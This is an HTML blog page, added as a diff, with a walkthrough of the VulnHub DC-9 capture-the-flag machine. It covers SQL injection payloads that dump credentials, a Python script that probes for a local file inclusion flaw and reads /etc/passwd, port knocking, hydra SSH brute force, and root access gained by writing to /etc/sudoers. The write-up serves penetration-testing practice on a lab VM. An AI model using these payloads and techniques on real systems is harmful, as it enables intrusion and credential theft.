@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html lang="en" class="html" data-theme="dark"><head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <title>
+    
+      VulnHub - DC 9
+    
+  </title>
+
+  <!-- Begin Jekyll SEO tag v2.7.3 -->
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="VulnHub - DC 9" />
+<meta name="author" content="s4rgaz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Description: Another vulnerable machine with the intent of gaining experience in the world of penetration testing." />
+<meta property="og:description" content="Description: Another vulnerable machine with the intent of gaining experience in the world of penetration testing." />
+<link rel="canonical" href="http://localhost:4000/dc-9.html" />
+<meta property="og:url" content="http://localhost:4000/dc-9.html" />
+<meta property="og:site_name" content="Home" />
+<meta property="og:image" content="https://soopr.xyz/images/card?url=http://localhost:4000/dc-9.html" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-04-16T00:00:00-05:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="og:image" content="https://soopr.xyz/images/card?url=http://localhost:4000/dc-9.html" />
+<meta property="twitter:title" content="VulnHub - DC 9" />
+<script type="application/ld+json">
+{"headline":"VulnHub - DC 9","dateModified":"2021-04-16T00:00:00-05:00","datePublished":"2021-04-16T00:00:00-05:00","url":"http://localhost:4000/dc-9.html","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/dc-9.html"},"author":{"@type":"Person","name":"s4rgaz"},"@type":"BlogPosting","description":"Description: Another vulnerable machine with the intent of gaining experience in the world of penetration testing.","@context":"https://schema.org"}</script>
+<script async defer data-soopr-token="" src="https://sdk.soopr.co/soopr.js"  ></script>
+<!-- End Jekyll SEO tag -->
+ 
+  <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Home" />
+
+  <link rel="shortcut icon" type="image/x-icon" href="//logo.png" />
+  <link rel="stylesheet" href="/assets/css/main.css" />
+  
+    <script type="text/javascript">
+  window.addEventListener('load', themeChange);
+  const currentTheme = localStorage.getItem('theme') ? localStorage.getItem('theme') : null;
+  if (currentTheme)
+    document.documentElement.setAttribute('data-theme', currentTheme);
+
+  function themeChange() {
+    let button = document.querySelector('.theme-toggle');
+
+    button.addEventListener('click', function (e) {
+      let currentTheme = document.documentElement.getAttribute('data-theme');
+      if (currentTheme === 'dark') {
+        transition();
+        document.documentElement.setAttribute('data-theme', 'light');
+        localStorage.setItem('theme', 'light');
+      } else {
+        transition();
+        document.documentElement.setAttribute('data-theme', 'dark');
+        localStorage.setItem('theme', 'dark');
+      }
+    });
+
+    let transition = () => {
+      document.documentElement.classList.add('transition');
+      window.setTimeout(() => {
+        document.documentElement.classList.remove('transition');
+      }, 1000);
+    }
+  }
+</script>
+
+
+  
+
+</head>
+<body>
+    <main class="page-content" aria-label="Content">
+      <div class="w">
+        <header>
+
+<ul class="horizontal-list">
+  
+    <li>
+      <a href="/">
+        Home
+      </a>
+      &nbsp;&nbsp;
+    </li>
+  
+    <li>
+      <a href="/walkthroughs">
+        Walkthroughs
+      </a>
+      &nbsp;&nbsp;
+    </li>
+  
+    <li>
+      <a href="/about">
+        About
+      </a>
+      &nbsp;&nbsp;
+    </li>
+  
+</ul>
+ 
+<!--  <div class="dashed"></div> -->
+
+
+<!--  <h1>Home</h1> -->
+  
+</header>
+
+<a href="/"></a>
+<h1 class="post-title">VulnHub - DC 9</h1> 
+<p class="post-date text-bold text-upcase">
+  
+    <span>April 2021</span>
+  
+</p>
+
+<div class="soopr-btn"
+   data-twitter="SooprCo"
+>
+</div>
+ 
+<p><strong>Description:</strong> Another vulnerable machine with the intent of gaining experience in the world of penetration testing.</p>
+
+<p><strong>Author:</strong> DCAU7</p>
+
+<p><strong>Operating System:</strong> Linux</p>
+
+<p><strong>Aim:</strong> To get root and to read the one and only flag.</p>
+
+<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/dc-9,412/">https://www.vulnhub.com/entry/dc-9,412/</a></p>
+
+<h2 id="information-gathering">Information Gathering</h2>
+<h3 id="host-dicovery">Host Dicovery</h3>
+<p>We start by discovering the target host on the local network, for this we will use arp-scan as shown below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>arp-scan <span class="nt">-I</span> vmnet1 192.168.179.1/24 
+Interface: vmnet1, <span class="nb">type</span>: EN10MB, MAC: 00:50:56:c0:00:01, IPv4: 192.168.179.1
+WARNING: host part of 192.168.179.1/24 is non-zero
+Starting arp-scan 1.9.7 with 256 hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
+192.168.179.128 00:0c:29:0f:98:6d       VMware, Inc.
+...
+</code></pre></div></div>
+
+<h3 id="port-scanning">Port Scanning</h3>
+<p>Ones the target is discovered, we proceed to scan all TCP ports with nmap, to detect possible open ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-T5</span> <span class="nt">-p1-65535</span> <span class="nt">-v</span> 192.168.179.128  
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-04-16 13:17 <span class="nt">-05</span>
+...
+Host is up <span class="o">(</span>0.0026s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65533 closed ports
+PORT   STATE    SERVICE
+22/tcp filtered ssh
+80/tcp open     http
+MAC Address: 00:0C:29:0F:98:6D <span class="o">(</span>VMware<span class="o">)</span>
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>9.83 seconds
+</code></pre></div></div>
+<p>In the output we can see that port 22 SSH is filtered, it is possible that certain firewall rules may be blocking incoming traffic, the only port that’s open is 80 HTTP.</p>
+
+<h3 id="service-enumeration">Service Enumeration</h3>
+
+<p>For obtain more information on the open port, we do an aggressive scan, this scan enables operating system detection, version scanning, script scanning and traceroute.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-A</span> <span class="nt">-p80</span> <span class="nt">-v</span> 192.168.179.128
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-04-16 13:32 <span class="nt">-05</span>
+...
+PORT   STATE    SERVICE VERSION
+80/tcp open     http    Apache httpd 2.4.38 <span class="o">((</span>Debian<span class="o">))</span>
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.38 <span class="o">(</span>Debian<span class="o">)</span>
+|_http-title: Example.com - Staff Details - Welcome
+MAC Address: 00:0C:29:0F:98:6D <span class="o">(</span>VMware<span class="o">)</span>
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Uptime guess: 42.715 days <span class="o">(</span>since Wed Apr 21 20:32:35 2021<span class="o">)</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>12.76 seconds
+</code></pre></div></div>
+
+<p>The result obtained indicates that port 80 is running Apache httpd 2.4.38, the possible operating system is debian and the supported methods.</p>
+
+<h3 id="web-browser-enumeration">Web Browser Enumeration</h3>
+<p>Browsing the web application in the <strong>Display All Records</strong> tab, users with personal information are listed, in the <strong>Search</strong> tab there’s a search box that retrieves users by name or surname, is possible that’is records are stored in a database and we try to test for SQL injection vulnerability, after several manual tests it could be detect that the web applicacion is vulnerable to SQL injection, as shown below:</p>
+
+<p><img src="/assets/images/DC-9/screenshot-1.png" alt="" /></p>
+
+<p>In the web application we can see that the all records are listed.</p>
+
+<p><img src="/assets/images/DC-9/screenshot-2.png" alt="" /></p>
+
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="sql-injection">SQL Injection</h3>
+<p><strong>Column Number Enumeration</strong></p>
+
+<p>Detected the vulnerability, I proceed to find the number of columns using the <strong>order by</strong> clause wich tries to sort the columns of the <strong>SELECT</strong> query, I started by sorting the first column and incrementing the value by one to the seventh column that does not produce any results, letting me to know that there’re six columns.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Mary<span class="s1">' order by 1 #
+...
+Mary'</span> order by 6 <span class="c">#</span>
+</code></pre></div></div>
+
+<p><strong>Understanding the layout of the output</strong></p>
+
+<p>Our next step is know if the parameters are printable on the vulnerable web application, for this we use the following query:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Mary<span class="s1">' and 1=2 union select 1,2,3,4,5,6 #
+</span></code></pre></div></div>
+<p>In the output it can be seen that all the injected parameters are displayed on the screen.</p>
+
+<p><img src="/assets/images/DC-9/screenshot-3.png" alt="" /></p>
+
+<p><strong>Extracting data from the Database</strong></p>
+
+<p>We started discovering the current database that’s using the web application, the current version of MySQL and the user being used for the database connection.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Mary<span class="s1">' and 1=2 union select database(),@@version,null,user(),null,null #
+</span></code></pre></div></div>
+
+<p><img src="/assets/images/DC-9/screenshot-4.png" alt="" /></p>
+
+<p>After we enumerate the available databases with the following statement:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Mary<span class="s1">' and 1=2 union select schema_name,null,null,null,null,null from information_schema.schemata #
+</span></code></pre></div></div>
+
+<p><img src="/assets/images/DC-9/screenshot-5.png" alt="" /></p>
+
+<p>We can see the <strong>Staff</strong> database that belongs to the web aplication and another one called <strong>users</strong>, at this moment we will try to list the names of the tables of the <strong>Staff</strong> schema.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Mary<span class="s1">' and 1=2 union select table_name,null,null,null,null,null from information_schema.tables where table_schema=database() #
+</span></code></pre></div></div>
+
+<p><img src="/assets/images/DC-9/screenshot-6.png" alt="" /></p>
+
+<p>In the output we see that there are two tables, let’s list the columns of the <strong>Users</strong> table which is the one that most catches our attention.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Mary<span class="s1">' and 1=2 union select column_name,null,null,null,null,null from information_schema.columns where table_schema=database() and table_name='</span>Users<span class="s1">' #
+</span></code></pre></div></div>
+
+<p><img src="/assets/images/DC-9/screenshot-7.png" alt="" /></p>
+
+<p>At this point I’m going to intercept the request with burpsuite to later make the request with curl and filter the data with regular expressions, in this way I have the credentials stored in a file on my machine.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Mary<span class="s1">' and 1=2 union select concat(Username,0x3a,Password),null,null,null,null,null from Users #
+</span></code></pre></div></div>
+
+<p><img src="/assets/images/DC-9/screenshot-8.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="s2">"http://192.168.179.128/results.php"</span> <span class="nt">--data</span> <span class="s2">"search=Mary%27+and+1%3D2++union+select+concat%28Username%2C0x3a%2CPassword%29%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull+from+Users+%23"</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s2">"</span><span class="se">\w</span><span class="s2">*:</span><span class="se">\S</span><span class="s2">{32}"</span> <span class="o">&gt;</span> users_staff
+root@kali:~<span class="nv">$ </span><span class="nb">cat </span>users_staff
+admin:856f5de590ef37314e7c3bdf6f8a66dc
+</code></pre></div></div>
+
+<p>In the result it can be seen that there’s only one record. Let’s try to crack this password hash in <a href="https://hashes.com">hashes.com</a>.</p>
+
+<p><img src="/assets/images/DC-9/screenshot-9.png" alt="" /></p>
+
+<p>As you can see, the password for this hash is <strong>transorbital1</strong></p>
+
+<p><strong>users database</strong></p>
+
+<p>Now let’s try to find out what interesting information may exist in the <strong>users</strong> schema, for this we start by listing the tables.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Mary<span class="s1">' and 1=2 union select table_name,null,null,null,null,null from information_schema.tables where table_schema='</span><span class="nb">users</span><span class="s1">' #
+</span></code></pre></div></div>
+
+<p><img src="/assets/images/DC-9/screenshot-10.png" alt="" /></p>
+
+<p>We have found the table <strong>UserDetails</strong>, let’s list their respective columns.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Mary<span class="s1">' and 1=2 union select column_name,null,null,null,null,null from information_schema.columns where table_schema='</span><span class="nb">users</span><span class="s1">' and table_name='</span>UserDetails<span class="s1">' #
+</span></code></pre></div></div>
+
+<p><img src="/assets/images/DC-9/screenshot-11.png" alt="" /></p>
+
+<p>In the output we see two important fields username and password, in the same way we intercept the request with burp and then create the request with curl and filter the data with regular expressions.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Mary<span class="s1">' and 1=2 union select concat(username,0x3a,password),null,null,null,null,null from users.UserDetails #
+</span></code></pre></div></div>
+
+<p><img src="/assets/images/DC-9/screenshot-12.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="s2">"http://192.168.179.128/results.php"</span> <span class="nt">--data</span> <span class="s2">"search=Mary%27++and+1%3D2+union+select+concat%28username%2C0x3a%2Cpassword%29%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull+from+users.UserDetails+%23"</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s2">"</span><span class="se">\w</span><span class="s2">*:</span><span class="se">\S</span><span class="s2">[^&lt;]*"</span> <span class="o">&gt;</span> UserDetails
+root@kali:~<span class="nv">$ </span><span class="nb">cat </span>UserDetails
+marym:3kfs86sfd
+julied:468sfdfsd2
+fredf:4sfd87sfd1
+barneyr:RocksOff
+tomc:TC&amp;TheBoyz
+jerrym:B8m#48sd
+wilmaf:Pebbles
+bettyr:BamBam01
+chandlerb:UrAG0D!
+joeyt:Passw0rd
+rachelg:yN72#dsd
+rossg:ILoveRachel
+monicag:3248dsds7s
+phoebeb:smellycats
+scoots:YR3BVxxxw87
+janitor:Ilovepeepee
+janitor2:Hawaii-Five-0
+</code></pre></div></div>
+
+<p>It can be seen that a list of users with their respective passwords were obtained in plain text.</p>
+<h3 id="local-file-inclusion">Local File Inclusion</h3>
+
+<p>Later with the credentials <strong>admin:transorbital1</strong> we log in to the web application and we find a message at the bottom “File does not exist”.</p>
+
+<p><img src="/assets/images/DC-9/screenshot-13.png" alt="" /></p>
+
+<p>It is possible that a certain parameter is being called and requires include a specific file, but we do not know the parameter name, it is also possible that there’s a Local File Inclusion vulnerability, in that case I developed a python script to brute force with a list of common parameters and including the web server passwd file how value, this dictionary can be found in seclists.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python3 </span>
+
+import requests
+from colorama import Fore,init
+
+init<span class="o">()</span>
+<span class="nv">green</span><span class="o">=</span>Fore.GREEN
+<span class="nv">gray</span><span class="o">=</span>Fore.LIGHTBLACK_EX
+<span class="nv">reset</span><span class="o">=</span>Fore.RESET
+
+<span class="nv">s</span><span class="o">=</span>requests.session<span class="o">()</span>
+
+def paramenum<span class="o">(</span>p<span class="o">)</span>:
+    <span class="nv">values</span><span class="o">={</span>
+            <span class="s1">'username'</span>:<span class="s1">'admin'</span>,
+            <span class="s1">'password'</span>:<span class="s1">'transorbital1'</span>
+            <span class="o">}</span>
+
+    <span class="nv">req</span><span class="o">=</span>s.post<span class="o">(</span><span class="s2">"http://192.168.179.128/manage.php"</span>, <span class="nv">data</span><span class="o">=</span>values<span class="o">)</span>
+    <span class="nv">req</span><span class="o">=</span>s.get<span class="o">(</span>f<span class="s2">"http://192.168.179.128/manage.php?{p}=../../../../../../etc/passwd"</span><span class="o">)</span>
+    <span class="k">return </span>len<span class="o">(</span>req.text<span class="o">)</span>
+
+<span class="nv">wordlist</span><span class="o">=</span>open<span class="o">(</span><span class="s2">"/opt/seclists/Discovery/Web-Content/burp-parameter-names.txt"</span><span class="o">)</span>.read<span class="o">()</span>.splitlines<span class="o">()</span>
+
+<span class="k">if </span><span class="nv">__name__</span><span class="o">==</span><span class="s2">"__main__"</span>:
+    <span class="k">for </span>parameter <span class="k">in </span>wordlist:
+        <span class="nv">x</span><span class="o">=</span>paramenum<span class="o">(</span>parameter<span class="o">)</span>
+        <span class="k">if </span>x <span class="o">!=</span> 1341:
+            print<span class="o">(</span>f<span class="s2">"{green}{parameter:20}=&gt; {x}{reset}"</span><span class="o">)</span>
+        <span class="k">else</span>:
+            print<span class="o">(</span>f<span class="s2">"{gray}{parameter:20}=&gt; {x}{reset}"</span><span class="o">)</span>
+
+</code></pre></div></div>
+
+<p>A moment after running the script, it can be seen that in the <strong>file</strong> parameter the size of the server’s response is different.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python3 lfi.py
+<span class="nb">id</span>                  <span class="o">=&gt;</span> 1341
+...
+file                <span class="o">=&gt;</span> 3694
+...
+code                <span class="o">=&gt;</span> 1341
+</code></pre></div></div>
+
+<p>I proceed to verify and you can see that the content of the passwd file is displayed on the web application, this means that exist a Local File Inclusion vulnerability.</p>
+
+<p><img src="/assets/images/DC-9/screenshot-14.png" alt="" /></p>
+
+<p>If we remember the port 22 is filtered, something is blocking the incoming traffic to that port, in certain cases a mechanism known as <strong>Port knocking</strong> is usually implemented as a security mechanism that allows open a port by attempting to connect to a series of ports closed. After googling I find that the configuration file is in <strong>/etc/knokd.conf</strong> and we try to see the content of this file, for this I have used curl as shown below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="nt">-L</span> <span class="nt">-X</span> POST <span class="s2">"http://192.168.179.128/manage.php"</span> <span class="nt">-c</span> cookiefile <span class="nt">--data</span> <span class="s2">"username=admin&amp;password=transorbital1"</span>
+root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="s2">"http://192.168.179.128/manage.php?file=../../../../../../etc/knockd.conf"</span> <span class="nt">-b</span> cookiefile | <span class="nb">grep</span> <span class="nt">-vP</span> <span class="s1">'[&gt;]\B'</span> | <span class="nb">sed</span> <span class="s2">"s/^</span><span class="se">\s</span><span class="s2">.*[&gt;]//g; 1,9d"</span>
+        UseSyslog
+
+<span class="o">[</span>openSSH]
+        sequence    <span class="o">=</span> 7469,8475,9842
+        seq_timeout <span class="o">=</span> 25
+        <span class="nb">command</span>     <span class="o">=</span> /sbin/iptables <span class="nt">-I</span> INPUT <span class="nt">-s</span> %IP% <span class="nt">-p</span> tcp <span class="nt">--dport</span> 22 <span class="nt">-j</span> ACCEPT
+        tcpflags    <span class="o">=</span> syn
+
+<span class="o">[</span>closeSSH]
+        sequence    <span class="o">=</span> 9842,8475,7469
+        seq_timeout <span class="o">=</span> 25
+        <span class="nb">command</span>     <span class="o">=</span> /sbin/iptables <span class="nt">-D</span> INPUT <span class="nt">-s</span> %IP% <span class="nt">-p</span> tcp <span class="nt">--dport</span> 22 <span class="nt">-j</span> ACCEPT
+        tcpflags    <span class="o">=</span> syn
+
+</code></pre></div></div>
+
+<p>In the output we see a sequence of ports that we have to connect to open port 22 and the same way there’s a secuence of ports to close it. I developed a bash oneliner that tries to connect to the ports <strong>7469 8475 9842</strong>, and we can verify that the SSH service is enabled.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="k">for </span>port <span class="k">in </span>7469 8475 9842<span class="p">;</span> <span class="k">do </span>nc 192.168.179.128 <span class="nv">$port</span><span class="p">;</span> <span class="k">done</span>
+<span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.128] 7469 <span class="o">(</span>?<span class="o">)</span> : Connection refused
+<span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.128] 8475 <span class="o">(</span>?<span class="o">)</span> : Connection refused
+<span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.128] 9842 <span class="o">(</span>?<span class="o">)</span> : Connection refused
+root@kali:~<span class="nv">$ </span> nc 192.168.179.128 22
+SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1
+</code></pre></div></div>
+
+<h3 id="access-via-ssh">Access via SSH</h3>
+<p>Then we try to verify if the credentials found allow us to have access via SSH, for this I used hydra.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>hydra <span class="nt">-C</span> UserDetails ssh://192.168.179.128 
+...
+<span class="o">[</span>DATA] attacking ssh://192.168.179.128:22/
+<span class="o">[</span>22][ssh] host: 192.168.179.128   login: chandlerb   password: UrAG0D!
+<span class="o">[</span>22][ssh] host: 192.168.179.128   login: joeyt       password: Passw0rd
+<span class="o">[</span>22][ssh] host: 192.168.179.128   login: janitor     password: Ilovepeepee
+1 of 1 target successfully completed, 3 valid passwords found
+</code></pre></div></div>
+
+<p>Three valid credentials were found, of which accessing as the user <strong>janitor</strong> I found the directory <strong>.secrets-for-putin</strong> with a file containing a list of passwords.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh <span class="nt">-l</span> janitor 192.168.179.128
+janitor@192.168.179.128<span class="s1">'s password: 
+janitor@dc-9:~/.secrets-for-putin$ cat passwords-found-on-post-it-notes.txt
+BamBam01
+Passw0rd
+smellycats
+P0Lic#10-4
+B4-Tru3-001
+4uGU5T-NiGHts
+</span></code></pre></div></div>
+
+<p>This passwords are stored in the file <strong>ssh_passwords</strong> on the attacking machine, and we filter the usernames of the <strong>UserDetails</strong> file to store them in another file named <strong>ssh_users</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">cat </span>ssh_passwords
+BamBam01 
+Passw0rd 
+smellycats
+P0Lic#10-4
+B4-Tru3-001
+4uGU5T-NiGHts
+root@kali:~<span class="nv">$ </span><span class="nb">cut</span> <span class="nt">-d</span> <span class="s2">":"</span> <span class="nt">-f</span> 1 UserDetails <span class="o">&gt;</span> ssh_users
+root@kali:~<span class="nv">$ </span><span class="nb">cat </span>ssh_users
+marym
+julied
+fredf
+barneyr
+tomc
+jerrym
+wilmaf
+bettyr
+chandlerb
+joeyt
+rachelg
+rossg
+monicag
+phoebeb
+scoots
+janitor
+janitor2
+</code></pre></div></div>
+
+<p>Then I made a brute force attack with hydra, where two valid users were found.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>hydra <span class="nt">-L</span> ssh_users <span class="nt">-P</span> ssh_passwords ssh://192.168.179.128
+...
+<span class="o">[</span>DATA] attacking ssh://192.168.179.128:22/
+<span class="o">[</span>22][ssh] host: 192.168.179.128   login: fredf   password: B4-Tru3-001
+<span class="o">[</span>22][ssh] host: 192.168.179.128   login: joeyt   password: Passw0rd
+1 of 1 target successfully completed, 2 valid passwords found
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="sudo-permissions">Sudo Permissions</h3>
+
+<p>We access via SSH with the credentials <strong>fredf:B4-Tru3-001</strong> we verify the sudo privileges and we found that it has permissions to execute a script without providing a password.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh <span class="nt">-l</span> fredf 192.168.179.128                      
+fredf@192.168.179.128<span class="s1">'s password: 
+fredf@dc-9:~$ sudo -l
+Matching Defaults entries for fredf on dc-9:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User fredf may run the following commands on dc-9:
+    (root) NOPASSWD: /opt/devstuff/dist/test/test
+</span></code></pre></div></div>
+
+<p>This script reads a file and adds the content to a file, to obtain root we create the <strong>sudo_perm</strong> file assigning sudo permissions to the user <strong>fredf</strong> to run any command without providing a password, then we execute the script as parameters the <strong>sudo_perm</strong> and <strong>sudoers</strong> files, and we get root.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fredf@dc-9:~<span class="nv">$ </span><span class="nb">sudo</span> /opt/devstuff/dist/test/test 
+Usage: python test.py <span class="nb">read </span>append
+fredf@dc-9:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"fredf ALL=(ALL) NOPASSWD:ALL"</span> <span class="o">&gt;</span> sudo_perm
+fredf@dc-9:~<span class="nv">$ </span><span class="nb">sudo</span> /opt/devstuff/dist/test/test sudo_perm /etc/sudoers
+fredf@dc-9:~<span class="nv">$ </span><span class="nb">sudo </span>su
+root@dc-9:/home/fredf# <span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</code></pre></div></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <footer>
+<!--	  <div class="dashed"></div> -->
+    <ul class="horizontal-list">
+  
+</ul>
+
+  </footer>
+
+
+        
+          <button title="Toggle Theme" class="theme-toggle">
+  <svg viewBox="0 0 32 32" width="24" height="24" fill="currentcolor">
+    <circle cx="16" cy="16" r="14" fill="none" stroke="currentcolor" stroke-width="4"></circle>
+    <path d="
+             M 16 0
+             A 16 16 0 0 0 16 32
+             z">
+    </path>
+  </svg>
+</button>
+
+        
+        <div class="credits">&copy;&nbsp;2022&nbsp;s4rgaz
+          &nbsp;
+		  •
+          &nbsp;<!--Powered by <a href="https://www.soopr.co" target="_blank" rel="noreferrer">Soopr</a>
+          &nbsp;
+		  •
+          &nbsp;-->
+		  <!--Theme&nbsp; <a href="https://github.com/abhinavs/moonwalk" target="_blank" rel="noreferrer">Moonwalk</a>-->
+		  RSS&nbsp; <a href="/feed.xml" target="_blank" rel="noreferrer">Feed</a>
+        </div>
+      </div>
+    </main><script async defer src="https://sdk.soopr.co/soopr.js"></script></body>
+</html>
